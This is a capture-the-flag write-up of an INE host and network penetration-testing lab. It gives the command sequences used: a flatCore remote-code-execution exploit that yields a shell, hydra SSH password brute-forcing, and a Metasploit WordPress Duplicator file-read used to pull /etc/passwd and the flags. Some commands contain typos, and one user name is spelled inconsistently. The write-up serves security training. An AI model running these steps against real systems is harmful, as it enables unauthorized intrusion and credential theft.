## Host & Network Penetration Testing: Exploitation CTF 1


### Flag 1: Identify and exploit the vulnerable web application running on target1.ine.local and retrieve the flag from the root directory. The credentials admin:password1 may be useful.

Using:
```
whatweb target1.ine.local
```
We are able to identify various pieces of information, including the CMS used to construct the website.
```
flatCore
```
```
serchsploit flatCore
searchsploit -m 50262
```
We find and copy the original authenticated remote command execution exploit.
```
python3 50262.py http://target1.ine.local admin password1
```
Using the command, we obtain a remote shell as the user www-data.

Navigating to root directory, we find the first flag.
```
cat /flag1.txt
```

### Flag 2: Further, identify and compromise an insecure system user on target1.ine.local.

Investigating the system and in particular the home folder, we discover the name of an active user:
```
iamweakuser
```
Enumerating other services with Nmap:
```
nmap -sS -sV -T4 target1.ine.local
```
We discover that ssh port is open, so we can try a brute-force attack on ssh service with the user just found.
```
hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://target1.ine.local
```
Hydra discover the correct password:
```
angel
```
```
ssh iamweakuser@target1.ine.local
```
Enumerating his home, we find the second flag.


### Flag 3: Identify and exploit the vulnerable plugin used by the web application running on target2.ine.local and retrieve the flag3.txt file from the root directory.

Using:
```
whatweb target2.ine.local
```
We are not able to discover anything useful.

We try with Nmap:
```
namp -sS -sV -p80 target2.ine.local --script http-wordpress-enum
```
and with Metasploit:
```
use auxiliary/scanner/http/wordpress_scanner
```
Both of them return us the duplicator version 1.3.26 plugin.
```
searchsploit duplicator
```
There is a Metasploit module that we can use.
```
use auxiliary/scanner/http/wp_duplicator_file_read
set RHOSTS target2.ine.local
set FILEPATH /flag3.txt
```
This way, we find the third flag.


### Flag 4: Further, identify and compromise a system user requiring no authentication on target2.ine.local.

By employing the same exploit but through a distinct path, we can identify additional users.
```
set FILEPATH /etc/passwd
iamacrazyfreeuser
```
We can attempt to log in by following the instructions provided in the task, utilizing the SSH service without the need for a password.
```
ssh iamacrazyfreeuser@target2.ine.local
```
Gained unauthorized access to the target machine. The final flag is located within the userâ€™s home directory.
